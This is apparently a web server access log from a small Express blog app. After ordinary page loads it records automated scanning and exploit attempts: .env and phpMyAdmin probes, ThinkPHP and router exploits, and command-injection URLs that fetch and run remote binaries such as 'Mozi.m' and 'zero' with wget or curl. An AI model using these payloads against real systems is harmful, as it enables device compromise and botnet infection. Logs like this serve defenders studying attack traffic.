[0mGET / [36m304 [0m11.289 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.205 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.562 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.332 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.338 ms - -[0m
[0mGET / [36m304 [0m1.487 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.386 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.650 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.725 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.956 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.541 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.675 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.497 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.493 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.732 ms - -[0m
[0mGET /blogs [36m304 [0m1.386 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.441 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.247 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.316 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.681 ms - -[0m
[0mGET / [36m304 [0m1.137 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.737 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.113 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.998 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.161 ms - -[0m
[0mGET /blogs [36m304 [0m1.300 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.641 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.328 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.384 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.610 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.278 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.135 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.181 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.054 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.478 ms - -[0m
[0mGET / [36m304 [0m1.065 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.535 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.976 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.000 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.178 ms - -[0m
[0mGET /blogs [36m304 [0m0.998 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.344 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.290 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.363 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.574 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.037 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.246 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.021 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.125 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.300 ms - -[0m
[0mPOST /sns/message/receive [33m404 [0m2.859 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m1.131 ms - 893[0m
[0mGET /blogs [36m304 [0m0.975 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.447 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.344 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.994 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.183 ms - -[0m
[0mGET /blogs/add [36m304 [0m2.052 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.607 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.005 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.051 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.309 ms - -[0m
[0mGET / [36m304 [0m1.099 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.709 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.941 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.581 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.392 ms - -[0m
[0mGET /blogs [36m304 [0m1.019 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.167 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m3.217 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.672 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.453 ms - -[0m
[0mGET /blogs/add [36m304 [0m0.975 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.833 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.844 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.573 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.076 ms - -[0m
[0mGET / [36m304 [0m1.079 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.583 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.109 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.917 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.666 ms - -[0m
[0mPOST /sns/message/receive [33m404 [0m0.897 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.924 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.846 ms - 893[0m
[0mGET / [36m304 [0m5.828 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.309 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.001 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m35.167 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m35.446 ms - -[0m
[0mGET / [32m200 [0m0.934 ms - 859[0m
[0mGET /stylesheets/style.css [32m200 [0m25.902 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m1.882 ms - 60044[0m
[0mGET /css/bootstrap.min.css [32m200 [0m27.606 ms - 160302[0m
[0mGET /js/jquery.min.js [32m200 [0m2.622 ms - 89476[0m
[0mGET /favicon.ico [33m404 [0m0.968 ms - 893[0m
[0mGET /blogs [32m200 [0m1.614 ms - 850[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.667 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.554 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.658 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.872 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.924 ms - 893[0m
[0mGET /blogs/add [32m200 [0m3.374 ms - 846[0m
[0mGET /stylesheets/style.css [36m304 [0m1.081 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.022 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.726 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.419 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.806 ms - 893[0m
[0mGET /blogs [36m304 [0m0.968 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.376 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.254 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.042 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.746 ms - -[0m
[0mPOST /sns/message/receive [33m404 [0m0.826 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m2.314 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.762 ms - 893[0m
[0mGET / [32m200 [0m44.890 ms - 859[0m
[0mHEAD / [32m200 [0m0.951 ms - 859[0m
[0mGET / [32m200 [0m2.408 ms - 859[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m1.902 ms - 893[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.931 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.952 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m11.797 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.938 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.942 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.943 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.859 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.730 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.801 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.695 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.609 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.743 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.802 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.746 ms - 893[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.701 ms - 893[0m
[0mGET / [32m200 [0m0.941 ms - 859[0m
[0mGET / [32m200 [0m0.993 ms - 859[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.979 ms - 893[0m
[0mGET /portal/redlion [33m404 [0m0.963 ms - 893[0m
[0mGET / [32m200 [0m0.975 ms - 859[0m
[0mGET / [32m200 [0m0.799 ms - 859[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.945 ms - 893[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.99.13.252:56014/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.083 ms - 893[0m
[0mGET / [32m200 [0m1.063 ms - 859[0m
[0mGET http://example.com/ [32m200 [0m0.965 ms - 859[0m
[0mGET /t [33m404 [0m0.909 ms - 893[0m
[0mHEAD /MjZL [33m404 [0m0.946 ms - 893[0m
[0mGET / [32m200 [0m1.478 ms - 859[0m
[0mGET / [32m200 [0m3.096 ms - 859[0m
[0mHEAD / [32m200 [0m0.934 ms - 859[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.743 ms - 893[0m
[0mGET / [32m200 [0m0.920 ms - 859[0m
[0mGET /robots.txt [33m404 [0m1.939 ms - 893[0m
[0mGET /sitemap.xml [33m404 [0m0.968 ms - 893[0m
[0mGET /.well-known/security.txt [33m404 [0m0.976 ms - 893[0m
[0mGET /favicon.ico [33m404 [0m0.982 ms - 893[0m
[0mGET / [32m200 [0m0.896 ms - 859[0m
[0mGET / [32m200 [0m0.900 ms - 859[0m
[0mGET /ReportServer [33m404 [0m0.921 ms - 893[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.924 ms - 893[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.908 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.917 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.909 ms - 893[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://124.135.42.214:48228/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.945 ms - 893[0m
[0mGET / [32m200 [0m0.874 ms - 859[0m
[0mGET /app/.env [33m404 [0m1.598 ms - 893[0m
[0mPOST /app [33m404 [0m46.557 ms - 893[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.144 ms - 893[0m
[0mHEAD / [32m200 [0m0.971 ms - 859[0m
[0mGET /hudson [33m404 [0m2.535 ms - 893[0m
[0mGET / [32m200 [0m0.895 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.6.245.102:49241/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.946 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.769 ms - 893[0m
[0mGET / [32m200 [0m0.942 ms - 859[0m
[0mGET / [32m200 [0m0.919 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.763 ms - 893[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://219.157.177.241:52166/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.955 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.756 ms - 893[0m
[0mGET / [32m200 [0m0.910 ms - 859[0m
[0mGET / [32m200 [0m0.962 ms - 859[0m
[0mGET / [32m200 [0m1.596 ms - 859[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.981 ms - 893[0m
[0mGET / [32m200 [0m1.005 ms - 859[0m
[0mGET / [32m200 [0m1.053 ms - 859[0m
[0mHEAD /robots.txt [33m404 [0m0.925 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.787 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.739 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.747 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.782 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.728 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.752 ms - 893[0m
[0mGET /.env [33m404 [0m1.634 ms - 893[0m
[0mPOST / [33m404 [0m1.721 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.733 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.730 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.709 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.733 ms - 893[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.235.65.255:49145/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.979 ms - 893[0m
[0mGET /manager/html [33m404 [0m0.899 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.733 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.761 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.734 ms - 893[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.887 ms - 893[0m
[0mGET / [32m200 [0m2.402 ms - 859[0m
[0mGET / [32m200 [0m0.914 ms - 859[0m
[0mGET / [32m200 [0m0.975 ms - 859[0m
[0mGET / [32m200 [0m0.900 ms - 859[0m
[0mGET / [32m200 [0m0.933 ms - 859[0m
[0mGET / [32m200 [0m6.859 ms - 859[0m
[0mGET / [32m200 [0m0.991 ms - 859[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m0.913 ms - 893[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.745 ms - 893[0m
[0mGET /portal/redlion [33m404 [0m0.900 ms - 893[0m
[0mGET / [32m200 [0m0.975 ms - 859[0m
[0mPOST /HNAP1/ [33m404 [0m0.876 ms - 893[0m
[0mGET / [32m200 [0m0.970 ms - 859[0m
[0mPOST /HNAP1/ [33m404 [0m0.756 ms - 893[0m
[0mPOST /HNAP1/ [33m404 [0m0.744 ms - 893[0m
[0mGET /TP/public/index.php [33m404 [0m0.890 ms - 893[0m
[0mGET /TP/index.php [33m404 [0m0.901 ms - 893[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.862 ms - 893[0m
[0mGET /html/public/index.php [33m404 [0m0.903 ms - 893[0m
[0mGET /public/index.php [33m404 [0m0.885 ms - 893[0m
[0mGET /TP/html/public/index.php [33m404 [0m1.784 ms - 893[0m
[0mGET /elrekt.php [33m404 [0m0.843 ms - 893[0m
[0mGET /index.php [33m404 [0m0.873 ms - 893[0m
[0mGET / [32m200 [0m0.879 ms - 859[0m
[0mGET / [32m200 [0m0.958 ms - 859[0m
[0mGET / [32m200 [0m0.806 ms - 859[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.737 ms - 893[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.978 ms - 893[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.939 ms - 893[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m1.880 ms - 893[0m
[0mGET /pma/scripts/setup.php [33m404 [0m1.032 ms - 893[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.890 ms - 893[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.908 ms - 893[0m
[0mGET / [32m200 [0m0.964 ms - 859[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.840 ms - 893[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.907 ms - 893[0m
[0mGET /phpMyAdmin-2/scripts/setup.php [33m404 [0m0.903 ms - 893[0m
[0mGET /my/scripts/setup.php [33m404 [0m0.929 ms - 893[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.872 ms - 893[0m
[0mGET /PHPMYADMIN/scripts/setup.php [33m404 [0m1.778 ms - 893[0m
[0mGET /db/scripts/setup.php [33m404 [0m0.891 ms - 893[0m
[0mGET /dbadmin/scripts/setup.php [33m404 [0m0.868 ms - 893[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.876 ms - 893[0m
[0mGET /mysql/scripts/setup.php [33m404 [0m0.883 ms - 893[0m
[0mGET /mysqladmin/scripts/setup.php [33m404 [0m0.922 ms - 893[0m
[0mGET /pHpMyAdMiN/scripts/setup.php [33m404 [0m0.868 ms - 893[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.860 ms - 893[0m
[0mGET /phpadmin/scripts/setup.php [33m404 [0m0.925 ms - 893[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.918 ms - 893[0m
[0mGET /sqladm/scripts/setup.php [33m404 [0m1.720 ms - 893[0m
[0mGET /sqladmin/scripts/setup.php [33m404 [0m0.923 ms - 893[0m
[0mGET /phpmyadmin/scripts/db.init.php [33m404 [0m0.924 ms - 893[0m
[0mGET /phpMyAdmin/scripts/db.init.php [33m404 [0m0.902 ms - 893[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.930 ms - 893[0m
[0mGET /database/scripts/setup.php [33m404 [0m0.888 ms - 893[0m
[0mGET /phpAdmin/scripts/setup.php [33m404 [0m0.858 ms - 893[0m
[0mGET /phpmyadmin1/scripts/setup.php [33m404 [0m0.905 ms - 893[0m
[0mGET /phpmyadmin2/scripts/setup.php [33m404 [0m0.887 ms - 893[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.849 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m1.508 ms - 893[0m
[0mGET /scripts/setup.php [33m404 [0m0.925 ms - 893[0m
[0mGET /setup.php [33m404 [0m0.847 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.712 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.734 ms - 893[0m
[0mGET / [32m200 [0m0.899 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.844 ms - 893[0m
[0mGET / [32m200 [0m0.941 ms - 859[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.917 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m1.795 ms - 859[0m
[0mGET / [32m200 [0m0.992 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.46.164.253:57361/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.922 ms - 893[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.866 ms - 893[0m
[0mGET / [32m200 [0m0.913 ms - 859[0m
[0mGET /.env [33m404 [0m0.798 ms - 893[0m
[0mPOST / [33m404 [0m0.957 ms - 893[0m
[0mGET /solr/ [33m404 [0m3.338 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.773 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.752 ms - 893[0m
[0mGET / [32m200 [0m0.918 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.804 ms - 893[0m
[0mGET /hudson [33m404 [0m0.944 ms - 893[0m
[0mGET / [32m200 [0m0.902 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.740 ms - 893[0m
[0mGET /.env [33m404 [0m0.784 ms - 893[0m
[0mGET /.env [33m404 [0m0.774 ms - 893[0m
[0mPOST / [33m404 [0m0.943 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.778 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.707 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m7.430 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.743 ms - 893[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.957 ms - 893[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.867 ms - 893[0m
[0mGET / [32m200 [0m0.884 ms - 859[0m
[0mGET / [32m200 [0m0.958 ms - 859[0m
[0mGET / [32m200 [0m0.942 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.769 ms - 893[0m
[0mGET /cdn-cgi/trace [33m404 [0m0.928 ms - 893[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.74.25.86:38173/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.892 ms - 893[0m
[0mGET /manager/html [33m404 [0m0.975 ms - 893[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.847 ms - 893[0m
[0mGET /phpMyAdmin-2/scripts/setup.php [33m404 [0m0.838 ms - 893[0m
[0mGET /my/scripts/setup.php [33m404 [0m0.856 ms - 893[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.851 ms - 893[0m
[0mGET /PHPMYADMIN/scripts/setup.php [33m404 [0m0.842 ms - 893[0m
[0mGET /db/scripts/setup.php [33m404 [0m0.837 ms - 893[0m
[0mGET /dbadmin/scripts/setup.php [33m404 [0m0.905 ms - 893[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m6.050 ms - 893[0m
[0mGET /mysql/scripts/setup.php [33m404 [0m0.981 ms - 893[0m
[0mGET /mysqladmin/scripts/setup.php [33m404 [0m0.917 ms - 893[0m
[0mGET /pHpMyAdMiN/scripts/setup.php [33m404 [0m0.859 ms - 893[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.936 ms - 893[0m
[0mGET /phpadmin/scripts/setup.php [33m404 [0m0.857 ms - 893[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.850 ms - 893[0m
[0mGET /sqladm/scripts/setup.php [33m404 [0m0.887 ms - 893[0m
[0mGET /sqladmin/scripts/setup.php [33m404 [0m0.868 ms - 893[0m
[0mGET /phpmyadmin/scripts/db.init.php [33m404 [0m0.839 ms - 893[0m
[0mGET /phpMyAdmin/scripts/db.init.php [33m404 [0m0.882 ms - 893[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.920 ms - 893[0m
[0mGET /database/scripts/setup.php [33m404 [0m1.837 ms - 893[0m
[0mGET /phpAdmin/scripts/setup.php [33m404 [0m0.940 ms - 893[0m
[0mGET /phpmyadmin1/scripts/setup.php [33m404 [0m0.842 ms - 893[0m
[0mGET /phpmyadmin2/scripts/setup.php [33m404 [0m0.928 ms - 893[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.984 ms - 893[0m
[0mGET /scripts/setup.php [33m404 [0m0.855 ms - 893[0m
[0mGET /setup.php [33m404 [0m0.865 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.752 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.716 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.725 ms - 893[0m
[0mGET / [32m200 [0m2.271 ms - 859[0m
[0mGET / [32m200 [0m0.760 ms - 859[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.854 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.731 ms - 893[0m
[0mPOST /sns/message/receive [33m404 [0m0.711 ms - 893[0m
[0mGET /portal/redlion [33m404 [0m0.901 ms - 893[0m
[0mGET /TP/public/index.php [33m404 [0m0.927 ms - 893[0m
[0mGET /TP/index.php [33m404 [0m0.895 ms - 893[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.864 ms - 893[0m
[0mGET /html/public/index.php [33m404 [0m0.963 ms - 893[0m
[0mGET /public/index.php [33m404 [0m1.742 ms - 893[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.862 ms - 893[0m
[0mGET /elrekt.php [33m404 [0m0.895 ms - 893[0m
[0mGET /index.php [33m404 [0m0.966 ms - 893[0m
[0mGET / [32m200 [0m0.873 ms - 859[0m
[0mGET / [32m200 [0m1.010 ms - 859[0m
[0mGET / [32m200 [0m0.970 ms - 859[0m
[0mGET / [32m200 [0m0.721 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.868 ms - 893[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.931 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.896 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.891 ms - 893[0m
[0mHEAD / [32m200 [0m0.932 ms - 859[0m
[0mGET / [32m200 [0m3.275 ms - 859[0m
[0mGET /link?url=lqqpmq+uMDU1&enpl=OH8s&encd=XQxMLzE= [33m404 [0m2.397 ms - 893[0m
[0mGET /link?url=lqqpmq+uMDU1&enpl=OH8s&encd=XQxMLjA= [33m404 [0m0.881 ms - 893[0m
[0mGET /link?url=lqqpmq+uMDU1&enpl=OH8s&encd=XQxMLzE= [33m404 [0m0.994 ms - 893[0m
[0mGET / [32m200 [0m0.882 ms - 859[0m
[0mGET /webfig/ [33m404 [0m0.881 ms - 893[0m
[0mGET /.env [33m404 [0m1.928 ms - 893[0m
[0mPOST / [33m404 [0m1.021 ms - 893[0m
[0mGET / [32m200 [0m0.880 ms - 859[0m
[0mGET / [32m200 [0m0.790 ms - 859[0m
[0mPOST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php [33m404 [0m0.772 ms - 893[0m
[0mPOST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php [33m404 [0m0.751 ms - 893[0m
[0mGET /.env [33m404 [0m0.841 ms - 893[0m
[0mPOST / [33m404 [0m1.025 ms - 893[0m
